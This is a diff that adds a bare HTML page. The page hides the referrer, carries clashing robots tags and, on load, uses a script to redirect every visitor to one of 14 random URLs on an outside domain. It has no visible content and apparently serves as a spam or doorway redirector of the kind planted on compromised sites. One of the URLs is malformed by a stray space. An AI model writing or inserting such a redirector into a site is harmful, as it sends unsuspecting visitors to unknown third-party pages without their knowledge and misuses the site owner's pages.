@@ -1,0 +1,35 @@
+<meta name="referrer" content="none">
+<META NAME="ROBOTS" CONTENT="NOINDEX, FOLLOW">
+<META NAME="ROBOTS" CONTENT="INDEX, NOFOLLOW">
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+<script type="text/javascript">
+var urls = new Array();
+urls[0]	= "https://rr.lovevova.com/Mzk1NTA2NTY=";
+urls[1]	= "https://rr.lovevova.com/Mzk1NTA3NDc=";
+urls[2]	= "https://rr.lovevova.com/Mzk1NTE5NDQ=";
+urls[3]	= "https://rr.lovevova.com/Mzk1NTM2NjQ=";
+urls[4]	= "https://rr.lovevova.com/Mzk1NTE4ODY=";
+urls[5]	= "https://rr.lovevova.com/Mzk1NTQxODI=";
+urls[6]	= "https://rr.lovevova.com/Mzk1NTY4MDQ=";
+urls[7]	= "https://rr.lovevova.com/Mzk1NzAyMzI=";
+urls[8]	= "https://rr.lovevova.com/Mzk1ODEzMDc=";
+urls[9]	= "https://rr.lovevova.com/Mzk1ODA3Mzg=";
+urls[10] = "https://rr.lovevova.com/Mzk1Nzc2Nzk=";
+urls[11] = "https://rr.lovevova.com/Mzk4ODkwODU=";
+urls[12] = "https://rr.lovevova.com/Mzk4NzM1NzE=";
+urls[13] = "https://rr.lovevova.com/Mzk4Njg1NT M=";
+
+
+var random = Math.floor(Math.random()*urls.length);
+
+window.location = urls[random];
+
+</script>
+
+
+
+
+
+
